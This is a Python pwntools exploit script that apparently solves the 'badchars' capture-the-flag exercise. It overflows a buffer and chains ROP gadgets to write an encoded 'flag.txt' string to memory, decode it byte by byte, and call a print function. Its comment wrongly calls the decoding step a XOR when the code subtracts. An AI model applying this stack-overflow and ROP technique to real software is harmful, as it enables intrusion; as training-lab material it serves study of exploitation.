#!/usr/bin/env python3

from pwn import *

elf = ELF('badchars')

context.bits = 64

'''
1. Set r12 to hnci0vzv r13 to writable address, r14 to 2
r15 to writeable address

2. write r12 to r13 value

3. xor r15 by lower value of r14  so it will become flag.txt

4. Pop RDI assign to r14 memory target

5. Call PrintFlag
'''
pop_r12_pop_r13_pop_r14_pop_r15_ret = p64(0x000000000040069c)
mov_qword_ptr_r13_r12_ret= p64(0x0000000000400634)
sub_byte_ptr_r15_r14b_ret = p64(0x0000000000400630)
pop_rdi = p64(0x00000000004006a3)
writeable_addr = 0x0000000000601030
print_addr = p64(0x0000000000400510)
pop_r14_pop_r15_ret = p64(0x00000000004006a0)
p = elf.process()

payload = b'A'*40
payload += pop_r12_pop_r13_pop_r14_pop_r15_ret
payload += b'hnci0vzv'
payload += p64(writeable_addr)
payload += p64(2)
payload += p64(1)
payload += mov_qword_ptr_r13_r12_ret

for i in range(8):
    payload += pop_r14_pop_r15_ret
    payload += p64(2) + p64(writeable_addr + i)
    payload += sub_byte_ptr_r15_r14b_ret

payload += pop_rdi
payload += p64(writeable_addr)
payload += print_addr

log.info(payload)

p = elf.process()

p.send(payload)
p.interactive()




